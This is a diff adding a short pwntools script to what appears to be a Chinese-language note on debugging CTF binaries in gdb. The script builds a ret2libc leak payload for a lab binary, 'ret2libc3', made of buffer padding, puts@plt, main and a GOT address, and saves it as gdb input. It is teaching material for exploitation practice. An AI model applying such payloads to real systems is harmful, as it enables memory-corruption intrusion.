@@ -1446,7 +1446,28 @@ $ hexdump input
 r < input
 ```
 
+- 将不可见字符保存成文件`input`的demo
 
+```python
+#!/usr/bin/env python  # gdb调试时输入不可见字符 demo 
+from pwn import *
+from LibcSearcher import LibcSearcher 
+context.log_level = "DEBUG"
+sh = process("./ret2libc3")
+
+ret2libc3 = ELF("./ret2libc3")
+puts_plt = ret2libc3.plt["puts"] 
+libc_start_main_got = ret2libc3.got["__libc_start_main"] 
+main = ret2libc3.symbols["main"] 
+
+print("leak libc_start_main_got addr and ret to main", str(hex(puts_plt)), str(hex(main)), str(hex(libc_start_main_got)))
+# puts_plt, main, libc_start_main_got: 0x08048460 0x08048618 0x0804a024
+payload = flat(['A' * (108+4), puts_plt, main, libc_start_main_got])
+print("payload: ", payload.hex(), type(payload)) # <class 'bytes'>
+# ...... 41414141 60840408 18860408 24a00408 
+with open("input", "wb") as f:
+    f.write(payload) 
+```
 
 
 
